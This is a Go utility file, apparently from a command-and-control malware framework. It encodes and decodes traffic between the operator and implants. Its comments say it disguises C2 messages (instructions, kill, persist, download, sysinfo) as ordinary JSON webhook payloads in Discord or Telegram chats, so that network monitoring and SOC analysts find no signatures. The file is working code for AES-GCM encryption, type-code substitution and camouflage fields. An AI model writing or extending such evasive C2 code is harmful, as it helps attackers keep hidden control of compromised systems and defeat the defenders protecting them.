package utils

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"strings"
	"time"
)

// ─────────────────────────────────────────
// Stealth Protocol Encoding
//
// All C2 messages are encoded as normal-looking JSON:
//   {"id":"a3f9","d":"<encrypted_base64>","t":1713421830}
//
// Inside "d" (after AES-256-GCM decrypt):
//   <2-char type code><pipe-delimited payload>
//   Example: "01agent123|instr001|whoami"
//
// To an NDR/SOC, it looks like a JSON webhook response
// pasted in a dev Discord/Telegram chat. No fixed signatures.
// ─────────────────────────────────────────

// Message type codes — replace plaintext keywords
var typeToCode = map[string]string{
	"INSTRUCTION": "01",
	"RESULT":      "02",
	"CHECKIN":     "03",
	"SWITCH":      "04",
	"SWITCHACK":   "05",
	"SLEEP":       "06",
	"JITTER":      "07",
	"KILL":        "08",
	"DOWNLOAD":    "09",
	"SYSINFO":     "0A",
	"PERSIST":     "0B",
}

var codeToType = map[string]string{
	"01": "INSTRUCTION",
	"02": "RESULT",
	"03": "CHECKIN",
	"04": "SWITCH",
	"05": "SWITCHACK",
	"06": "SLEEP",
	"07": "JITTER",
	"08": "KILL",
	"09": "DOWNLOAD",
	"0A": "SYSINFO",
	"0B": "PERSIST",
}

// wireMessage is the JSON envelope for stealth encoding.
// Looks like a normal API/webhook payload in chat.
type wireMessage struct {
	ID   string `json:"id"` // Random 4-char hex (camouflage)
	Data string `json:"d"`  // Encrypted payload (base64)
	Time int64  `json:"t"`  // Unix timestamp (camouflage)
}

// DeriveKey derives a 32-byte AES-256 key from a shared secret using SHA-256.
func DeriveKey(secret string) []byte {
	hash := sha256.Sum256([]byte(secret))
	return hash[:]
}

// Encrypt plaintext using AES-256-GCM. Returns raw bytes (nonce + ciphertext).
func aesEncrypt(plaintext []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("cipher: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("gcm: %w", err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, fmt.Errorf("nonce: %w", err)
	}

	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

// Decrypt AES-256-GCM ciphertext. Input: nonce + ciphertext bytes.
func aesDecrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("cipher: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("gcm: %w", err)
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// randomHex generates n random bytes as hex string.
func randomHex(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// ─────────────────────────────────────────
// Public API
// ─────────────────────────────────────────

// EncodeMessage takes a protocol message like "INSTRUCTION|agent|id|cmd",
// replaces the keyword with a type code, encrypts it, and wraps it in JSON.
//
// Input:  "INSTRUCTION|agent123|instr001|whoami"
// Output: {"id":"a3f9","d":"IF1sJ4UU...","t":1713421830}
func EncodeMessage(message string, key []byte) (string, error) {
	// Split off the keyword
	parts := strings.SplitN(message, "|", 2)
	keyword := parts[0]

	code, ok := typeToCode[keyword]
	if !ok {
		// Unknown type — encode the whole message as-is with code "FF"
		code = "FF"
		parts = []string{keyword, message}
	}

	// Build inner payload: <2-char code><rest of message after keyword>
	var inner string
	if len(parts) == 2 {
		inner = code + parts[1]
	} else {
		inner = code
	}

	// Encrypt
	encrypted, err := aesEncrypt([]byte(inner), key)
	if err != nil {
		return "", err
	}

	// Wrap in JSON envelope
	envelope := wireMessage{
		ID:   randomHex(2),
		Data: base64.RawStdEncoding.EncodeToString(encrypted),
		Time: time.Now().Unix(),
	}

	jsonBytes, err := json.Marshal(envelope)
	if err != nil {
		return "", fmt.Errorf("json: %w", err)
	}

	return string(jsonBytes), nil
}

// DecodeMessage takes a JSON-encoded wire message, decrypts it,
// and returns the original protocol message with the keyword restored.
//
// Input:  {"id":"a3f9","d":"IF1sJ4UU...","t":1713421830}
// Output: "INSTRUCTION|agent123|instr001|whoami"
//
// If the message is not valid JSON or decryption fails, returns
// the original message unchanged (backwards compatible).
func DecodeMessage(message string, key []byte) (string, error) {
	// Try to parse as JSON envelope
	var envelope wireMessage
	if err := json.Unmarshal([]byte(message), &envelope); err != nil {
		// Not JSON — check for legacy ENC| format
		if len(message) > 4 && message[:4] == "ENC|" {
			return decodeLegacy(message[4:], key)
		}
		// Not our message — return as-is
		return message, nil
	}

	// No "d" field — not our message
	if envelope.Data == "" {
		return message, nil
	}

	// Base64 decode
	encrypted, err := base64.RawStdEncoding.DecodeString(envelope.Data)
	if err != nil {
		return message, nil // Not ours
	}

	// Decrypt
	plaintext, err := aesDecrypt(encrypted, key)
	if err != nil {
		return message, nil // Wrong key or not ours
	}

	inner := string(plaintext)
	if len(inner) < 2 {
		return message, nil
	}

	// Extract type code and restore keyword
	code := inner[:2]
	payload := inner[2:]

	keyword, ok := codeToType[code]
	if !ok {
		if code == "FF" {
			return payload, nil // Raw message
		}
		return message, nil
	}

	// Reconstruct original format: KEYWORD|payload
	if payload != "" {
		return keyword + "|" + payload, nil
	}
	return keyword, nil
}

// decodeLegacy handles the old ENC|<base64> format for backwards compat.
func decodeLegacy(encoded string, key []byte) (string, error) {
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", fmt.Errorf("legacy base64: %w", err)
	}
	plaintext, err := aesDecrypt(data, key)
	if err != nil {
		return "", fmt.Errorf("legacy decrypt: %w", err)
	}
	return string(plaintext), nil
}

// Base64Encode is a convenience wrapper.
func Base64Encode(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}

// Base64Decode is a convenience wrapper.
func Base64Decode(encoded string) ([]byte, error) {
	return base64.StdEncoding.DecodeString(encoded)
}
